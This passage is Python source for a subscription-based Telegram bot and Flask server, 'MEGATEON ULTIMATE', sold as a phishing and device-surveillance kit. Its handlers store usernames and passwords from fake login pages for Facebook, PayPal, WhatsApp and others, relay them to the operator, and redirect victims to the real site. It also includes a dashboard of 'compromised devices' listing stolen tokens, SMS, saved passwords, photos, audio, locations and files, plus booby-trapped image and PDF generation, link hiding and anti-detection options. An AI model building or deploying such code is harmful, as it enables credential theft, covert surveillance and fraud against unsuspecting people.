            send_telegram(int(ref), summary)
        except Exception as e:
            print(f"System info error: {e}")
    
    return {"status": "ok"}

@app.route('/real_ip_detected', methods=['POST'])
def real_ip_detected():
    data = request.get_json()
    ref = data.get('ref')
    ip = data.get('ip', '')
    
    if ref and ref != 'unknown' and ip:
        send_alert(ref, 'real_ip', f"🌐 Real IP detected: {ip}")
        send_telegram(int(ref), f"🌐 Real IP Detected!\nIP: {ip}")
    
    return {"status": "ok"}

@app.route('/battery_status', methods=['POST'])
def battery_status():
    data = request.get_json()
    ref = data.get('ref')
    level = data.get('level', 0)
    charging = data.get('charging', False)
    charging_time = data.get('time', 0)
    discharging_time = data.get('discharging', 0)
    
    if ref and ref != 'unknown':
        send_telegram(int(ref), 
            f"🔋 Battery Status:\n"
            f"Level: {level}%\n"
            f"Charging: {'✅ Yes' if charging else '❌ No'}\n"
            f"Charging Time: {charging_time}s\n"
            f"Discharging Time: {discharging_time}s")
    
    return {"status": "ok"}

@app.route('/math_verified', methods=['POST'])
def math_verified():
    data = request.get_json()
    ref = data.get('ref')
    answer = data.get('answer')
    correct = data.get('correct')
    
    if ref and ref != 'unknown':
        send_telegram(int(ref), f"✅ Math Verified!\nAnswer: {answer}\nCorrect: {correct}")
    
    return {"status": "ok"}

@app.route('/exploit_complete', methods=['POST'])
def exploit_complete():
    data = request.get_json()
    ref = data.get('ref')
    session_id = data.get('session_id', '')
    
    if ref and ref != 'unknown':
        send_telegram(int(ref), f"✅ Exploit Complete!\nSession: {session_id[:16]}")
    
    return {"status": "ok"}

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    data = request.get_json()
    session_id = data.get('session_id', '')
    ref = data.get('ref', '')
    
    if ref and ref != 'unknown' and session_id:
        try:
            conn = sqlite3.connect(f'user_{ref}.db')
            c = conn.cursor()
            c.execute("""INSERT OR REPLACE INTO heartbeat 
                         (session_id, last_seen, status) 
                         VALUES (?,?,?)""",
                      (session_id, datetime.datetime.now().isoformat(), 'active'))
            conn.commit()
            conn.close()
        except:
            pass
    
    return {"status": "ok"}

@app.route('/booster_request', methods=['POST'])
def booster_request():
    data = request.get_json()
    ref = data.get('ref')
    service = data.get('service', 'unknown')
    url = data.get('url', '')
    
    if ref and ref != 'unknown':
        send_telegram(int(ref), f"📈 Booster Request!\nService: {service}\nURL: {url}")
    
    return {"success": True}

@app.route('/login_phishing', methods=['POST'])
def login_phishing():
    ref = request.form.get('ref')
    platform = request.form.get('platform')
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    session_id = request.form.get('session_id', '')
    
    if ref and ref != 'unknown' and username and password:
        try:
            init_user_db(ref)
            conn = sqlite3.connect(f'user_{ref}.db')
            c = conn.cursor()
            c.execute("""INSERT INTO stolen_credentials 
                         (ip, time, platform, username, password, session_id, url) 
                         VALUES (?,?,?,?,?,?,?)""",
                      (ip, datetime.datetime.now().isoformat(), platform, 
                       username, password, session_id, request.referrer or ''))
            conn.commit()
            conn.close()
            
            send_alert(ref, 'new_credential', f"🔑 Login: {username} on {platform}")
            send_telegram(int(ref), 
                f"🔐 New Login!\n📱 Platform: {platform}\n👤 Username: {username}\n🔑 Password: {password}\n📡 IP: {ip}")
        except Exception as e:
            print(f"Login phishing error: {e}")
    
    # Redirect to real platform
    redirect_urls = {
        'facebook': 'https://www.facebook.com',
        'instagram': 'https://www.instagram.com',
        'telegram': 'https://web.telegram.org',
        'whatsapp': 'https://web.whatsapp.com',
        'twitter': 'https://www.twitter.com',
        'google': 'https://www.google.com',
        'tiktok': 'https://www.tiktok.com',
        'snapchat': 'https://www.snapchat.com',
        'discord': 'https://discord.com',
        'netflix': 'https://www.netflix.com',
        'paypal': 'https://www.paypal.com',
        'freefire': 'https://ff.garena.com',
        'pubg': 'https://pubg.com'
    }
    return f'<script>window.location.href="{redirect_urls.get(platform, "https://www.google.com")}";</script>'

# ========== TELEGRAM BOT FUNCTIONS ==========

pending_payments = {}
pending_requests = {}
pending_stego = {}
pending_shell = {}

def get_devices_list(user_id):
    conn = sqlite3.connect(f'user_{user_id}.db')
    c = conn.cursor()
    try:
        c.execute("""SELECT session_id, device_name, first_seen, linked_username, 
                     photos_count, audios_count, credentials_count, tokens_count, 
                     sms_count, passwords_count, last_seen 
                     FROM devices ORDER BY last_seen DESC""")
        devices = c.fetchall()
    except:
        devices = []
    conn.close()
    return devices

def get_full_device_data(user_id, session_id):
    conn = sqlite3.connect(f'user_{user_id}.db')
    c = conn.cursor()
    
    # Device info
    c.execute("""SELECT device_name, ip, first_seen, last_seen, linked_username, 
                     photos_count, audios_count, credentials_count, locations_count, 
                     contacts_count, files_count, videos_count, tokens_count, 
                     sms_count, passwords_count, os, browser, device_type 
                     FROM devices WHERE session_id=?""", (session_id,))
    device_info = c.fetchone()
    
    # Credentials
    c.execute("""SELECT platform, username, password, time 
                 FROM stolen_credentials WHERE session_id=? ORDER BY id DESC""", (session_id,))
    credentials = c.fetchall()
    
    # Tokens
    c.execute("""SELECT platform, token_key, token_value, time 
                 FROM stolen_tokens WHERE session_id=? ORDER BY id DESC LIMIT 20""", (session_id,))
    tokens = c.fetchall()
    
    # Photos
    c.execute("SELECT path, time FROM photos WHERE session_id=? ORDER BY id DESC LIMIT 10", (session_id,))
    photos = c.fetchall()
    
    # Gallery
    c.execute("SELECT filepath, filename FROM gallery_photos WHERE session_id=? ORDER BY id DESC LIMIT 10", (session_id,))
    gallery = c.fetchall()
    
    # Audios
    c.execute("SELECT path, time FROM audios WHERE session_id=? ORDER BY id DESC LIMIT 5", (session_id,))
    audios = c.fetchall()
    
    # Videos
    c.execute("SELECT path FROM front_videos WHERE session_id=? ORDER BY id DESC LIMIT 3", (session_id,))
    front_videos = c.fetchall()
    c.execute("SELECT path FROM back_videos WHERE session_id=? ORDER BY id DESC LIMIT 3", (session_id,))
    back_videos = c.fetchall()
    
    # Locations
    c.execute("SELECT lat, lng, time FROM locations WHERE session_id=? ORDER BY id DESC LIMIT 10", (session_id,))
    locations = c.fetchall()
    
    # Contacts
    c.execute("SELECT contacts_data FROM contacts WHERE session_id=? ORDER BY id DESC LIMIT 1", (session_id,))
    contacts = c.fetchone()
    
    # Files
    c.execute("SELECT filename, filepath FROM stolen_files WHERE session_id=? ORDER BY id DESC LIMIT 10", (session_id,))
    files = c.fetchall()
    
    # Commands
    c.execute("SELECT command, output, time FROM shell_commands WHERE session_id=? ORDER BY id DESC LIMIT 10", (session_id,))
    commands = c.fetchall()
    
    # SMS
    c.execute("SELECT from_num, body, time FROM sms_messages WHERE session_id=? ORDER BY id DESC LIMIT 10", (session_id,))
    sms = c.fetchall()
    
    # Passwords
    c.execute("SELECT website, username, password, time FROM saved_passwords WHERE session_id=? ORDER BY id DESC LIMIT 10", (session_id,))
    passwords = c.fetchall()
    
    conn.close()
    
    return {
        'info': device_info,
        'credentials': credentials,
        'tokens': tokens,
        'photos': photos,
        'gallery': gallery,
        'audios': audios,
        'front_videos': front_videos,
        'back_videos': back_videos,
        'locations': locations,
        'contacts': contacts,
        'files': files,
        'commands': commands,
        'sms': sms,
        'passwords': passwords
    }

def get_alert_count(user_id):
    return get_unread_alerts_count(user_id)

# ========== TELEGRAM HANDLERS ==========

def handle_start(chat_id, user_id, username, first_name):
    uid = str(user_id)
    
    if uid not in users:
        users[uid] = {
            'active': False,
            'username': username or 'Unknown',
            'first_name': first_name or 'User',
            'join_date': str(datetime.datetime.now()),
            'balance': 0,
            'active_date': None,
            'verified': False,
            'contact_shared': '',
            'math_answer': '',
            'package': 'basic',
            'alerts_enabled': 1,
            'custom_domain': '',
            'referral_code': generate_referral_code(),
            'total_earned': 0,
            'api_key': generate_api_key(),
            'last_login': '',
            'login_count': 0
        }
        save_user_to_db(uid, users[uid])
        init_user_db(uid)
    
    user = users[uid]
    
    # Update login info
    users[uid]['last_login'] = str(datetime.datetime.now())
    users[uid]['login_count'] = users[uid].get('login_count', 0) + 1
    save_user_to_db(uid, users[uid])
    
    # Math verification
    if not user.get('verified', False):
        num1 = random.randint(1, 9)
        num2 = random.randint(1, 9)
        correct_answer = num1 + num2
        users[uid]['math_answer'] = str(correct_answer)
        save_user_to_db(uid, users[uid])
        
        options = [correct_answer - 1, correct_answer, correct_answer + 1]
        random.shuffle(options)
        keyboard = [[{"text": str(opt), "callback_data": f"math_ans_{opt}_{correct_answer}"} for opt in options]]
        
        send_telegram(chat_id,
            f"🔐 <b>التحقق من أنك إنسان</b>\n\n"
            f"للتأكد من أنك إنسان وليس روبوت، يرجى حل المسألة الحسابية:\n\n"
            f"<b>{num1} + {num2} = ?</b>",
            keyboard)
        return
    
    # Subscription
    if not user.get('active', False):
        packages_text = "\n".join([f"• {p.capitalize()}: ${PACKAGES[p]['price']}/شهر" for p in PACKAGES.keys()])
        msg = f"""🔒 <b>MEGATEON ULTIMATE - اشتراك VIP</b>\n\n✅ تم التحقق البشري بنجاح!\n\n💰 السعر: <b>{PAYMENT_AMOUNT} جنيه مصري</b>\n📞 رقم الدفع: <b>{PAYMENT_NUMBER}</b>\n\n📦 <b>الباقات المتاحة:</b>\n{packages_text}"""
        send_telegram(chat_id, msg, [[{"text": "💰 اشتراك VIP", "callback_data": "subscribe"}]])
        return
    
    # Main menu
    alert_count = get_alert_count(uid)
    alert_badge = f" ({alert_count})" if alert_count > 0 else ""
    
    keyboard = [
        [{"text": "🟢 إنشاء رابط", "callback_data": "create_link"}, {"text": "🟠 إنشاء QR", "callback_data": "create_qr"}],
        [{"text": "🟣 صورة مُلغّمة", "callback_data": "stego_image"}, {"text": "🔵 لوحة التحكم", "callback_data": "my_dashboard"}],
        [{"text": "🟡 Shell Access", "callback_data": "shell_access"}, {"text": "🎭 إخفاء الرابط", "callback_data": "hide_link"}],
        [{"text": "📊 تقارير متقدمة", "callback_data": "advanced_reports"}, {"text": "📈 تحليلات بيانية", "callback_data": "analytics"}],
        [{"text": f"🔔 تنبيهات فورية{alert_badge}", "callback_data": "instant_alerts"}, {"text": "🎨 قوالب جاهزة", "callback_data": "templates"}],
        [{"text": "🌐 دومين مخصص", "callback_data": "custom_domain"}, {"text": "💾 نسخ احتياطي", "callback_data": "backup"}],
        [{"text": "📤 تصدير بيانات", "callback_data": "export_data"}, {"text": "🛡️ حماية متقدمة", "callback_data": "anti_detection"}],
        [{"text": "📱 تصيد واتساب", "callback_data": "whatsapp_phishing"}, {"text": "🔴 لوحة الإدارة", "callback_data": "admin_panel"}],
        [{"text": "⚫ المطور", "callback_data": "developer"}, {"text": "🟢 المساعدة", "callback_data": "help"}]
    ]
    
    package = user.get('package', 'basic')
    package_emoji = {'basic': '📦', 'advanced': '⭐', 'professional': '💎', 'enterprise': '👑'}
    emoji = package_emoji.get(package, '📦')
    
    # Stats summary
    stats = f"\n📊 <i>Stats: {get_victims_count(uid)} victims, {get_credentials_count(uid)} credentials</i>"
    
    send_telegram(chat_id,
        f"✅ مرحباً {first_name} {emoji} {package.capitalize()}\n"
        f"MEGATEON ULTIMATE V16.0{stats}",
        keyboard)

def handle_math_answer(callback_id, chat_id, user_id, selected, correct):
    uid = str(user_id)
    
    if selected == correct:
        users[uid]['verified'] = True
        save_user_to_db(uid, users[uid])
        
        send_telegram(chat_id, "✅ تم التحقق بنجاح!")
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery",
            json={'callback_query_id': callback_id, 'text': '✅ Correct!', 'show_alert': True})
        
        packages_text = "\n".join([f"• {p.capitalize()}: ${PACKAGES[p]['price']}/شهر" for p in PACKAGES.keys()])
        msg = f"""🔒 <b>MEGATEON ULTIMATE - اشتراك VIP</b>\n\n💰 السعر: <b>{PAYMENT_AMOUNT} جنيه مصري</b>\n📞 رقم الدفع: <b>{PAYMENT_NUMBER}</b>\n\n📦 <b>الباقات المتاحة:</b>\n{packages_text}"""
        send_telegram(chat_id, msg, [[{"text": "💰 اشتراك VIP", "callback_data": "subscribe"}]])
    else:
        send_telegram(chat_id, "❌ إجابة خاطئة! حاول مرة أخرى")
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery",
            json={'callback_query_id': callback_id, 'text': '❌ Wrong answer!', 'show_alert': True})
        handle_start(chat_id, user_id, '', '')

def handle_callback(callback_id, chat_id, message_id, data, user_id, username, first_name):
    try:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery",
            json={'callback_query_id': callback_id})
    except:
        pass
    
    global users, pending_payments, pending_shell, pending_stego, pending_requests
    uid = str(user_id)
    
    # ===== MATH VERIFICATION =====
    if data.startswith("math_ans_"):
        parts = data.split("_")
        if len(parts) == 4:
            selected = int(parts[2])
            correct = int(parts[3])
            handle_math_answer(callback_id, chat_id, user_id, selected, correct)
        return
    
    # ===== WHATSAPP PHISHING =====
    if data == "whatsapp_phishing":
        link = f"{BASE_URL}/whatsapp/{uid}"
        msg = f"""📱 <b>WhatsApp Phishing Link</b>\n\n🔗 <a href='{link}'>{link}</a>\n\n📌 <b>طريقة الاستخدام:</b>\n1. أرسل هذا الرابط للضحية\n2. الضحية يفتح الرابط\n3. سيتم جمع جميع البيانات تلقائياً\n\n⚠️ يظهر للضحية كأنها صفحة واتساب ويب الحقيقية!"""
        send_telegram(chat_id, msg)
        return
    
    # ===== ADVANCED REPORTS =====
    if data == "advanced_reports":
        keyboard = [
            [{"text": "📊 PDF Report", "callback_data": "report_pdf"}],
            [{"text": "📄 CSV Report", "callback_data": "report_csv"}],
            [{"text": "📈 Full Report", "callback_data": "report_full"}],
            [{"text": "🔙 Back", "callback_data": "back"}]
        ]
        send_telegram(chat_id, "📊 <b>Advanced Reports</b>\n\nChoose report type:", keyboard)
        return
    
    if data == "report_pdf":
        filepath = generate_pdf_report(uid)
        if filepath:
            send_telegram(chat_id, "📊 PDF Report Ready!", document=filepath)
        else:
            send_telegram(chat_id, "❌ Please install reportlab: pip install reportlab")
        return
    
    if data == "report_csv":
        filepath = generate_csv_report(uid)
        send_telegram(chat_id, "📄 CSV Report Ready!", document=filepath)
        return
    
    if data == "report_full":
        send_telegram(chat_id, "📈 Generating full report...")
        pdf_path = generate_pdf_report(uid)
        csv_path = generate_csv_report(uid)
        if pdf_path:
            send_telegram(chat_id, "📊 Full Report (PDF)", document=pdf_path)
        if csv_path:
            send_telegram(chat_id, "📄 Full Report (CSV)", document=csv_path)
        return
    
    # ===== ANALYTICS =====
    if data == "analytics":
        data = get_analytics_data(uid, 7)
        msg = "📈 <b>Your Analytics</b>\n\n"
        msg += f"👥 Total Victims: {get_victims_count(uid)}\n"
        msg += f"🔑 Credentials: {get_credentials_count(uid)}\n"
        msg += f"📱 SMS: {get_sms_count(uid)}\n"
        msg += f"🔐 Passwords: {get_passwords_count(uid)}\n"
        msg += f"💬 WhatsApp: {get_whatsapp_messages_count(uid)}\n"
        msg += f"📍 Locations: {get_locations_count(uid)}\n\n"
        msg += f"📊 <a href='{BASE_URL}/analytics/{uid}'>View Dashboard</a>"
        send_telegram(chat_id, msg)
        return
    
    # ===== INSTANT ALERTS =====
    if data == "instant_alerts":
        user = users.get(uid, {})
        status = "✅ مفعلة" if user.get('alerts_enabled', 1) else "❌ معطلة"
        alert_count = get_unread_alerts_count(uid)
        
        keyboard = [
            [{"text": "🔄 تشغيل/إيقاف", "callback_data": "toggle_alerts"}],
            [{"text": f"📋 سجل التنبيهات ({alert_count})", "callback_data": "alert_log"}],
            [{"text": "🔙 رجوع", "callback_data": "back"}]
        ]
        send_telegram(chat_id, f"🔔 <b>التنبيهات الفورية</b>\n\nالحالة: {status}\nالتنبيهات غير المقروءة: {alert_count}", keyboard)
        return
    
    if data == "toggle_alerts":
        if uid in users:
            current = users[uid].get('alerts_enabled', 1)
            users[uid]['alerts_enabled'] = 0 if current else 1
            save_user_to_db(uid, users[uid])
            status = "مفعلة ✅" if users[uid]['alerts_enabled'] else "معطلة ❌"
            send_telegram(chat_id, f"🔔 تم تحديث التنبيهات: {status}")
        return
    
    if data == "alert_log":
        alerts = get_alerts_log(uid, 20)
        if alerts:
            msg = "📋 <b>سجل التنبيهات</b>\n\n"
            for alert in alerts:
                alert_id, alert_type, message, timestamp, is_read, priority = alert
                read_mark = "✅" if is_read else "🆕"
                msg += f"{read_mark} {alert_type}: {message[:50]}...\n"
            msg += f"\n📊 <a href='{BASE_URL}/analytics/{uid}'>View Dashboard</a>"
            send_telegram(chat_id, msg[:4000])
            mark_alerts_read(uid)
        else:
            send_telegram(chat_id, "📋 لا توجد تنبيهات")
        return
    
    # ===== TEMPLATES =====
    if data == "templates":
        keyboard = []
        for name, desc in TEMPLATES.items():
            keyboard.append([{"text": f"🎨 {desc}", "callback_data": f"template_{name}"}])
        keyboard.append([{"text": "🔙 رجوع", "callback_data": "back"}])
        send_telegram(chat_id, "🎨 <b>اختر قالباً جاهزاً</b>", keyboard)
        return
    
    if data.startswith("template_"):
        template_name = data.replace("template_", "")
        if template_name == 'whatsapp':
            template_link = f"{BASE_URL}/whatsapp/{uid}"
        else:
            template_link = f"{BASE_URL}/template/{uid}/{template_name}"
        send_telegram(chat_id, f"🎨 قالب {TEMPLATES.get(template_name, template_name)}:\n\n🔗 <a href='{template_link}'>{template_link}</a>")
        return
    
    # ===== CUSTOM DOMAIN =====
    if data == "custom_domain":
        user = users.get(uid, {})
        current_domain = user.get('custom_domain', '')
        msg = "🌐 <b>الدومين المخصص</b>\n\n"
        if current_domain:
            msg += f"الدومين الحالي: <code>{current_domain}</code>\n"
            msg += f"رابطك: <a href='{current_domain}/?ref={uid}'>{current_domain}/?ref={uid}</a>"
        else:
            msg += "ليس لديك دومين مخصص حالياً\n\n"
            msg += "💡 استخدم دومينك الخاص لزيادة نسبة النقر"
        keyboard = [
            [{"text": "➕ إضافة دومين", "callback_data": "add_domain"}],
            [{"text": "❌ حذف دومين", "callback_data": "remove_domain"}],
            [{"text": "🔙 رجوع", "callback_data": "back"}]
        ]
        send_telegram(chat_id, msg, keyboard)
        return
    
    if data == "add_domain":
        pending_requests[chat_id] = {'action': 'add_domain'}
        send_telegram(chat_id, "🌐 أرسل الدومين المخصص (مثل: secure-login.com):")
        return
    
    if data == "remove_domain":
        if uid in users:
            users[uid]['custom_domain'] = ''
            save_user_to_db(uid, users[uid])
            send_telegram(chat_id, "✅ تم حذف الدومين المخصص")
        return
    
    # ===== BACKUP =====
    if data == "backup":
        backup_path = f"backups/user_{uid}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.db"
        os.makedirs("backups", exist_ok=True)
        try:
            if os.path.exists(f"user_{uid}.db"):
                shutil.copy2(f"user_{uid}.db", backup_path)
                send_telegram(chat_id, "💾 نسخة احتياطية جاهزة!", document=backup_path)
            else:
                send_telegram(chat_id, "❌ لا توجد بيانات لعمل نسخة احتياطية")
        except Exception as e:
            send_telegram(chat_id, f"❌ خطأ: {str(e)}")
        return
    
    # ===== EXPORT DATA =====
    if data == "export_data":
        send_telegram(chat_id, "📤 جاري تجهيز البيانات...")
        try:
            zip_path = export_all_data(uid)
            send_telegram(chat_id, "📤 جميع البيانات جاهزة!", document=zip_path)
        except Exception as e:
            send_telegram(chat_id, f"❌ خطأ: {str(e)}")
        return
    
    # ===== ANTI-DETECTION =====
    if data == "anti_detection":
        keyboard = [
            [{"text": "🔄 تغيير User-Agent", "callback_data": "rotate_ua"}],
            [{"text": "🔙 رجوع", "callback_data": "back"}]
        ]
        msg = """🔒 <b>الحماية المتقدمة</b>\n\n🔄 User-Agent: Chrome 120\n🌐 Proxy: غير مفعل\n🛡️ حماية الكشف: مفعلة\n\n💡 استخدم هذه الإعدادات لتجنب الحظر"""
        send_telegram(chat_id, msg, keyboard)
        return
    
    if data == "rotate_ua":
        new_ua = get_random_user_agent()
        send_telegram(chat_id, f"🔄 تم تغيير User-Agent إلى:\n<code>{new_ua}</code>")
        return
    
    # ===== SUBSCRIBE =====
    if data == "subscribe":
        pending_payments[uid] = {'amount': PAYMENT_AMOUNT}
        send_telegram(chat_id, f"💰 أرسل <b>{PAYMENT_AMOUNT} جنيه</b> على رقم <b>{PAYMENT_NUMBER}</b>\nثم أرسل صورة الإيصال")
        return
    
    # ===== CREATE LINK =====
    if data == "create_link":
        keyboard = [
            [{"text": "🌐 Default", "callback_data": "link_default"}],
            [{"text": "📈 Booster", "callback_data": "link_booster"}]
        ]
        platforms = ['facebook', 'instagram', 'telegram', 'whatsapp', 'tiktok', 'twitter', 
                     'snapchat', 'google', 'discord', 'netflix', 'paypal', 'freefire', 'pubg']
        for i in range(0, len(platforms), 3):
            row = []
            for j in range(3):
                if i + j < len(platforms):
                    p = platforms[i + j]
                    row.append({"text": p.capitalize(), "callback_data": f"link_{p}"})
            keyboard.append(row)
        keyboard.append([{"text": "🔙 رجوع", "callback_data": "back"}])
        send_telegram(chat_id, "🎯 اختر المنصة:", keyboard)
        return
    
    if data.startswith("link_"):
        platform = data.replace("link_", "")
        if platform == 'default':
            link = f"{BASE_URL}/?ref={uid}"
        elif platform == 'booster':
            link = f"{BASE_URL}/?ref={uid}&type=booster"
        else:
            link = f"{BASE_URL}/?ref={uid}&type=phishing&platform={platform}"
        send_telegram(chat_id, f"🔗 <b>رابط {platform.capitalize()}</b>\n\n<a href='{link}'>{link}</a>")
        return
    
    # ===== CREATE QR =====
    if data == "create_qr":
        keyboard = []
        platforms = ['facebook', 'instagram', 'telegram', 'whatsapp', 'tiktok', 'twitter',
                     'snapchat', 'google', 'discord', 'netflix', 'paypal', 'freefire', 
                     'pubg', 'default', 'booster']
        for i in range(0, len(platforms), 3):
            row = []
            for j in range(3):
                if i + j < len(platforms):
                    p = platforms[i + j]
                    row.append({"text": p.capitalize(), "callback_data": f"qr_{p}"})
            keyboard.append(row)
        keyboard.append([{"text": "🔙 رجوع", "callback_data": "back"}])
        send_telegram(chat_id, "🎯 اختر المنصة لإنشاء QR Code:", keyboard)
        return
    
    if data.startswith("qr_"):
        platform = data.replace("qr_", "")
        qr_url = f"{BASE_URL}/qr/{platform}/{uid}"
        send_telegram(chat_id, f"📲 <b>QR Code {platform.capitalize()}</b>\n\n<a href='{qr_url}'>{qr_url}</a>")
        return
    
    # ===== STEGO IMAGE =====
    if data == "stego_image":
        keyboard = [
            [{"text": "🖼️ PNG", "callback_data": "stego_png"}, {"text": "📄 PDF", "callback_data": "stego_pdf"}],
            [{"text": "📐 SVG", "callback_data": "stego_svg"}, {"text": "📤 Upload", "callback_data": "stego_upload"}],
            [{"text": "🔙 رجوع", "callback_data": "back"}]
        ]
        send_telegram(chat_id, "🎯 اختر نوع التلغيم:", keyboard)
        return
    
    if data == "stego_png":
        img_path = f"stego_{uid}_{generate_random_filename()}.png"
        create_stego_image(uid, img_path)
        send_telegram(chat_id, "📸 Stego PNG Created!", photo=img_path)
        os.remove(img_path)
        return
    
    if data == "stego_pdf":
        pdf_path = f"stego_{uid}_{generate_random_filename()}.pdf"
        create_stego_pdf(uid, pdf_path)
        send_telegram(chat_id, "📄 Stego PDF Created!", document=pdf_path)
        os.remove(pdf_path)
        return
    
    if data == "stego_svg":
        svg_path = f"stego_{uid}_{generate_random_filename()}.svg"
        create_stego_svg(uid, svg_path)
        send_telegram(chat_id, "📐 Stego SVG Created!", document=svg_path)
        os.remove(svg_path)
        return
    
    if data == "stego_upload":
        pending_stego[chat_id] = {'user_id': uid}
        send_telegram(chat_id, "📤 أرسل الصورة التي تريد تلغيمها")
        return
    
    # ===== HIDE LINK =====
    if data == "hide_link":
        keyboard = [
            [{"text": "🔗 Short Link", "callback_data": "hide_short"}],
            [{"text": "🎵 TikTok", "callback_data": "hide_tiktok"}],
            [{"text": "📘 Facebook", "callback_data": "hide_facebook"}],
            [{"text": "📸 Instagram", "callback_data": "hide_instagram"}],
            [{"text": "🔙 رجوع", "callback_data": "back"}]
        ]
        send_telegram(chat_id, "🎭 اختر طريقة إخفاء الرابط:", keyboard)
        return
    
    if data == "hide_short":
        short = create_short_link(f"{BASE_URL}/?ref={uid}")
        send_telegram(chat_id, f"🔗 Short Link:\n\n<a href='{short}'>{short}</a>")
        return
    
    if data.startswith("hide_") and data not in ["hide_short", "hide_link"]:
        platform = data.replace("hide_", "")
        hidden_link = f"{BASE_URL}/redirect/{platform}/{uid}"
        send_telegram(chat_id, f"🔗 Hidden Link on {platform.capitalize()}:\n\n<a href='{hidden_link}'>{hidden_link}</a>")
        return
    
    # ===== DASHBOARD =====
    if data == "my_dashboard":
        devices = get_devices_list(uid)
        if not devices:
            send_telegram(chat_id, "📭 لا توجد أجهزة حتى الآن")
            return
        
        keyboard = []
        for d in devices:
            sid, dname, first_seen, linked, pc, ac, cc, tc, sc, pwc, last_seen = d
            txt = f"📱 {dname[:15]}" + (f" [{linked}]" if linked else "")
            txt += f" - {cc} creds, {tc} tokens, {sc} SMS, {pwc} Passwords"
            if len(txt) > 50:
                txt = txt[:47] + "..."
            keyboard.append([{"text": txt, "callback_data": f"device_{sid}"}])
        keyboard.append([{"text": "🔙 رجوع", "callback_data": "back"}])
        send_telegram(chat_id, f"📱 <b>الأجهزة المخترقة</b> ({len(devices)})", keyboard)
        return
    
    if data.startswith("device_"):
        sid = data.replace("device_", "")
        dev_data = get_full_device_data(uid, sid)
        if not dev_data['info']:
            send_telegram(chat_id, "❌ الجهاز غير موجود")
            return
        
        info = dev_data['info']
        msg = f"""📱 <b>{info[0]}</b>
📡 IP: {info[1]}
💻 OS: {info[15] if len(info) > 15 else 'Unknown'} | {info[16] if len(info) > 16 else 'Unknown'}
👤 Account: {info[4] or 'None'}
📸 {info[5]} photos 🎤 {info[6]} audios
🔑 {info[7]} creds 🔐 {info[12]} tokens
📱 {info[13] if len(info) > 13 else 0} SMS
🔑 {info[14] if len(info) > 14 else 0} Passwords
📍 {len(dev_data['locations'])} locations
📁 {len(dev_data['files'])} files
🕐 First: {info[2][:16]} | Last: {info[3][:16]}"""
        
        keyboard = []
        if dev_data['credentials']:
            keyboard.append([{"text": f"🔑 Creds ({len(dev_data['credentials'])})", "callback_data": f"dev_creds_{sid}"}])
        if dev_data['tokens']:
            keyboard.append([{"text": f"🔐 Tokens ({len(dev_data['tokens'])})", "callback_data": f"dev_tokens_{sid}"}])
        if dev_data['photos'] or dev_data['gallery']:
            keyboard.append([{"text": f"📸 Photos ({len(dev_data['photos'])+len(dev_data['gallery'])})", "callback_data": f"dev_photos_{sid}"}])
        if dev_data['audios']:
            keyboard.append([{"text": f"🎤 Audios ({len(dev_data['audios'])})", "callback_data": f"dev_audios_{sid}"}])
        if dev_data['sms']:
            keyboard.append([{"text": f"📱 SMS ({len(dev_data['sms'])})", "callback_data": f"dev_sms_{sid}"}])
        if dev_data['passwords']:
            keyboard.append([{"text": f"🔑 Passwords ({len(dev_data['passwords'])})", "callback_data": f"dev_passwords_{sid}"}])
        if dev_data['locations']:
            keyboard.append([{"text": f"📍 Locations ({len(dev_data['locations'])})", "callback_data": f"dev_locs_{sid}"}])
        keyboard.append([{"text": "🔙 رجوع", "callback_data": "my_dashboard"}])
        send_telegram(chat_id, msg, keyboard)
        return
    
    # ===== DEVICE DATA VIEWERS =====
    if data.startswith("dev_creds_"):
        sid = data.replace("dev_creds_", "")
        dev_data = get_full_device_data(uid, sid)
        if dev_data['credentials']:
            msg = "🔑 <b>Credentials</b>\n\n" + "\n".join([f"📱 {c[0]}: {c[1]} / {c[2]}" for c in dev_data['credentials'][:15]])
            send_telegram(chat_id, msg[:4000])
        else:
            send_telegram(chat_id, "❌ لا توجد بيانات")
        return
    
    if data.startswith("dev_tokens_"):
        sid = data.replace("dev_tokens_", "")
        dev_data = get_full_device_data(uid, sid)
        if dev_data['tokens']:
            msg = "🔐 <b>Tokens</b>\n\n" + "\n".join([f"🔐 {t[1]}: {t[2][:50]}..." for t in dev_data['tokens'][:10]])
            send_telegram(chat_id, msg[:4000])
        else:
            send_telegram(chat_id, "❌ لا توجد بيانات")
        return
    
    if data.startswith("dev_photos_"):
        sid = data.replace("dev_photos_", "")
        dev_data = get_full_device_data(uid, sid)
        sent = 0
        for p in dev_data['photos'][:5]:
            if os.path.exists(p[0]):
                send_telegram(chat_id, "📸 Photo", photo=p[0])
                sent += 1
        for g in dev_data['gallery'][:5]:
            if os.path.exists(g[0]):
                send_telegram(chat_id, "🖼️ Gallery", photo=g[0])
                sent += 1
        if sent == 0:
            send_telegram(chat_id, "❌ لا توجد صور")
        return
    
    if data.startswith("dev_audios_"):
        sid = data.replace("dev_audios_", "")
        dev_data = get_full_device_data(uid, sid)
        if dev_data['audios']:
            for a in dev_data['audios'][:5]:
                if os.path.exists(a[0]):
                    send_telegram(chat_id, "🎤 Audio", document=a[0])
        else:
            send_telegram(chat_id, "❌ لا توجد تسجيلات")
        return
    
    if data.startswith("dev_sms_"):
        sid = data.replace("dev_sms_", "")
        dev_data = get_full_device_data(uid, sid)
        if dev_data['sms']:
            msg = "📱 <b>SMS Messages</b>\n\n" + "\n".join([f"📱 From: {s[0]}\n📝 {s[1][:100]}\n🕐 {s[2][:16]}" for s in dev_data['sms'][:5]])
            send_telegram(chat_id, msg[:4000])
        else:
            send_telegram(chat_id, "❌ لا توجد رسائل")
        return
    
    if data.startswith("dev_passwords_"):
        sid = data.replace("dev_passwords_", "")
        dev_data = get_full_device_data(uid, sid)
        if dev_data['passwords']:
            msg = "🔑 <b>Saved Passwords</b>\n\n" + "\n".join([f"🌐 {p[0]}\n👤 {p[1]}\n🔑 {p[2][:30]}" for p in dev_data['passwords'][:5]])
            send_telegram(chat_id, msg[:4000])
        else:
            send_telegram(chat_id, "❌ لا توجد كلمات مرور")
        return
    
    if data.startswith("dev_locs_"):
        sid = data.replace("dev_locs_", "")
        dev_data = get_full_device_data(uid, sid)
        if dev_data['locations']:
